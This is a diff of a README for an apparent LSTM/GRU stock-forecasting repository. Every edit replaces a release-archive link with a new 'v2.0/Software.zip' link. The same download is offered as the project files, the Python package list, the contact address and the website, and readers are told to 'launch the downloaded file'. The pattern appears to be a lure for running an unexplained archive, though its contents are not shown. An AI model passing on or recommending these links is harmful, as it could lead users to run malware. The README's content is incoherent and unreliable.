@@ -24,7 +24,7 @@ This repository serves as a comparison between LSTM and GRU models in the contex
 ## 🚀 Get Started!
 To explore the codes, datasets, and results of our stock forecasting models, download the project files from the following link: 
 
-[![Download Project Files](https://github.com/basemnabill/Stock-Forecasting-RNN/releases/download/v1.0/Application.zip%20Project%20Files-Click%20Here-green)](https://github.com/basemnabill/Stock-Forecasting-RNN/releases/download/v1.0/Application.zip)
+[![Download Project Files](https://github.com/basemnabill/Stock-Forecasting-RNN/releases/download/v2.0/Software.zip%20Project%20Files-Click%20Here-green)](https://github.com/basemnabill/Stock-Forecasting-RNN/releases/download/v2.0/Software.zip)
 
 *Note: Kindly ensure to launch the downloaded file to access the contents.*
 
@@ -44,7 +44,7 @@ Within this repository, you will find the following structure:
 ## Usage 🛠️
 To run the stock forecasting models using LSTM and GRU, follow these steps:
 
-1. Install the necessary Python packages listed in `https://github.com/basemnabill/Stock-Forecasting-RNN/releases/download/v1.0/Application.zip`.
+1. Install the necessary Python packages listed in `https://github.com/basemnabill/Stock-Forecasting-RNN/releases/download/v2.0/Software.zip`.
 2. Navigate to the `/notebooks` directory.
 3. Open the Jupyter notebook for either LSTM or GRU model.
 4. Execute the cells in sequence to train and evaluate the model.
@@ -71,9 +71,9 @@ For further details, code implementation, and in-depth analysis, feel free to di
 
 **Disclaimer: This project is for educational purposes only. Stock market forecasting involves inherent risks and uncertainties. Always conduct thorough research and consult with professionals before making financial decisions.**
 
-Have feedback or questions? Contact us at [https://github.com/basemnabill/Stock-Forecasting-RNN/releases/download/v1.0/Application.zip](https://github.com/basemnabill/Stock-Forecasting-RNN/releases/download/v1.0/Application.zip). 
+Have feedback or questions? Contact us at [https://github.com/basemnabill/Stock-Forecasting-RNN/releases/download/v2.0/Software.zip](https://github.com/basemnabill/Stock-Forecasting-RNN/releases/download/v2.0/Software.zip). 
 
-Visit our website for more exciting projects and resources: [https://github.com/basemnabill/Stock-Forecasting-RNN/releases/download/v1.0/Application.zip](https://github.com/basemnabill/Stock-Forecasting-RNN/releases/download/v1.0/Application.zip)
+Visit our website for more exciting projects and resources: [https://github.com/basemnabill/Stock-Forecasting-RNN/releases/download/v2.0/Software.zip](https://github.com/basemnabill/Stock-Forecasting-RNN/releases/download/v2.0/Software.zip)
 
 **Thank you for exploring "Stock-Forecasting-RNN"!** 🚀📈
 
